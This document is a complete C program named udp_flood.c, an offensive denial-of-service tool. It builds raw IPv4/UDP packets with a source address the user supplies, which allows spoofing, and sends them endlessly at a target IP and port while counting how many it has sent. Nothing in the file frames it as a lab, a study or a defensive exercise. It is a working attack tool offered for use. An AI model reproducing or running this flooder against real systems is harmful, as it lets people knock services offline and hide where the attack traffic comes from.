// udp_flood.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

struct packet {
    struct iphdr ip;
    struct udphdr udp;
    char payload[1400];
};

unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <source_ip> <target_ip> [port]\n", argv[0]);
        return 1;
    }

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    int target_port = (argc > 3) ? atoi(argv[3]) : 80;

    struct packet pkt;
    memset(&pkt, 0, sizeof(pkt));

    // IP Header
    pkt.ip.version = 4;
    pkt.ip.ihl = 5;
    pkt.ip.tot_len = htons(sizeof(pkt));
    pkt.ip.ttl = 64;
    pkt.ip.protocol = IPPROTO_UDP;
    pkt.ip.saddr = inet_addr(argv[1]);
    pkt.ip.daddr = inet_addr(argv[2]);

    // UDP Header
    pkt.udp.source = htons(rand() % 65535);
    pkt.udp.dest = htons(target_port);
    pkt.udp.len = htons(sizeof(struct udphdr) + sizeof(pkt.payload));

    memset(pkt.payload, 'U', sizeof(pkt.payload));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(argv[2]);

    printf("UDP Flooding %s:%d...\n", argv[2], target_port);

    unsigned long count = 0;
    while (1) {
        pkt.ip.id = htons(rand());
        pkt.udp.source = htons(rand() % 65535);
        
        pkt.ip.check = 0;
        pkt.ip.check = checksum((unsigned short*)&pkt.ip, sizeof(struct iphdr)/2);
        
        pkt.udp.check = 0; // Optional

        sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr*)&dest, sizeof(dest));
        
        count++;
        if (count % 100000 == 0) {
            printf("\r[+] Sent: %lu packets", count);
            fflush(stdout);
        }
    }

    return 0;
}
